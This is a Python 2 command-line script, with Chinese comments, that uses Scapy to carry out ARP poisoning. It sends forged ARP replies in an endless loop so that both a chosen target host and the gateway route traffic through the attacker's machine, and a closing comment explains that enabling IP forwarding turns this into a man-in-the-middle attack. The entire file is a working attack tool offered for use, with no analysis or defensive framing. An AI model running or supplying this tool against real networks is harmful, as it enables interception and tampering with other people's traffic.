#!/usr/bin/python
# -*- coding: utf-8 -*
import sys
import signal
import os
from scapy.all import (Ether, ARP, get_if_hwaddr, get_if_addr, getmacbyip,
                       sendp)
from optparse import OptionParser
def main():
    try:
        if int(os.getuid()) != 0:
            print 'Your uid is ' + str(os.getuid()) + ', must be run as Root!'
            sys.exit()
    except Exception, msg:
        print msg
    usage = '%prog [-i interface] [-t target] Gateway'
    parser = OptionParser(usage)
    parser.add_option(
        '-i', dest='interface', help='Specify the interface to use,default is Wlan0')
    parser.add_option(
        '-t', dest='target', help='Specify a particular IP address to ARP poison')
    parser.add_option(
        '-s',
        action='store_true',
        dest='summary',
        default=False,
        help='Show packet summary and ask for confirmation before poisoning')
    (options, args) = parser.parse_args()  # args为一元组,其中存储-s中的参数
    if len(args) != 1 or options.interface is None:
        print 'Specify the Gateway!' 
        parser.print_help()
        sys.exit()
    
    def rep():
        if options.target is None:
            print'Require the target IP'
        elif options.target:
            target_mac = getmacbyip(options.target)
            gateway_mac=getmacbyip(args[0])
            mac = get_if_hwaddr(options.interface)
            if target_mac is None:
                print 'Target not alive'
                exit(1)
            kpt1 = Ether(
                src=mac, dst=target_mac) / ARP(hwsrc=mac,
                                               psrc=args[0],
                                               hwdst=target_mac,
                                               pdst=options.target,
                                               op=2)#伪装网关欺骗主机
            kpt2=Ether(
                src=mac, dst=gateway_mac) / ARP(hwsrc=mac,
                                               psrc=options.target,
                                               hwdst=gateway_mac,
                                               pdst=args[0],
                                               op=2)#伪装主机欺骗网关
        return (kpt1,kpt2)   
    kpt1,kpt2=rep()
    print 'start cheating,target IP is ' + options.target + ' target MAC is ' + str(
        getmacbyip(options.target))
    if options.summary is True:
        kpt1.show()
        kpt2.show()
        print kpt1.summary()
        print kpt2.summary()
        ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
        if ans == 'y' or len(ans) == 0:
            pass
        else:
            sys.exit(0)
    while True:
              
        sendp(kpt1, inter=2, iface=options.interface)
        sendp(kpt2, inter=2, iface=options.interface)    
#sysctl net.ipv4.ip_forward=1 开启ip转发才可进行中间人攻击

if __name__ == '__main__':
    main()
